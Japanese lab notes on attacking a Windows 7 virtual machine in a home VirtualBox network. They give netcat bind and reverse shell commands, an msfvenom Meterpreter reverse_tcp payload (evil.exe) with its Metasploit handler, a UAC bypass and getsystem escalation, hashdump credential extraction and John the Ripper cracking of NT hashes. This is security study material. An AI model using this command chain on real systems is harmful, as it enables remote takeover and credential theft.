# ハッキング・ラボ メモ

## Windowsハッキング

- VirtualBox

  ```bash
  # /etc/vbox/networks.conf ファイルを新規作成。以下を記入
  * 10.0.0.0/24
  ```

  - ホストネットワークマネージャ > 作成
    - アダプター
      - IPv4: 10.0.0.1
      - IPv4マスク: 255.255.255.0
    - DHCPサーバ
      - サーバアドレス: 10.0.0.100
      - サーバマスク: 255.255.255.0
        - アドレス下限: 10.0.0.101
        - アドレス上限: 10.0.0.254
- [Windows7試用ovaファイル](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/)
  - 選択オプション
    - Virtual Machines: IE8 on Win7(x86)
    - VM platform: VirtualBox

```bash
# Windows側
nc.exe -lvp 5555
```

- -l: 待ち受け
- -v: 詳細表示
- -p: ポート番号指定

```bash
netstat -an
```

- -a: すべての接続を表示
- -n: 名前解決しない。サービス名解決しない。

```bash
# Windows側
nc.exe -lvp 5555 -e cmd.exe
# ホスト側
nc [target IP] 5555
```

### リバースシェル

```bash
# ホスト側
nc -lvp 5555
# Windows側
nc.exe [host IP] 5555 -e cmd.exe
```

### Metasploit Framework

- 調査、侵入、攻撃、バックドアの設置・接続。サーバ侵入の一連の攻撃をサポート
- 実践で使われる場面は少ない

```bash
msfconsole

show exploits
```

- Exploitのランク
  - manual < low < average < normal < good < great < excellent
  - excellentが最も望ましく、システムをクラッシュさせることなく任意のコマンドを実行できる

```bash
search type:payload reverse_tcp platform:windows

# TCP型リバースシェルを作成
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 -f exe -o ./evil.exe
# -p: ペイロードのパス
# -f: 出力ファイルの形式
# -o: 出力ファイルのパス
# LHOST: ペイロードのオプション。接続先を指定

# リバースシェルを待ち受ける
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [ホストIP]
# evil.exeをWindows側で起動した後
# リバースシェルを確立する
exploit
```

```bash
# Meterpreterプロンプトで使用可能
pwd, ls, cd
```

### パスワードハッシュを入手する

```bash
# ユーザ名を確認
getuid
# 権限昇格のため、一旦meterpreterセッションをバックグラウンドへ
background
# UACバイパスモジュール
use exploit/windows/local/bypassuac
set SESSION [セッションNo]
set payload windows/meterpreter/reverse_tcp
set LHOST [ホストIP]
exploit

# ユーザ確認
getuid
# 権限昇格
getsystem -t 1
# ユーザ確認
getuid
# パスワードハッシュダンプ取得
# ※現状は"ArgumentError wrong number of arguments"エラーとなっている
run hashdump
```

### パスワード解析

```bash
john [パスワードファイルパス] --show
john --wordlist=/usr/share/john/password.lst --format:nt .[パスワードファイルパス]
```
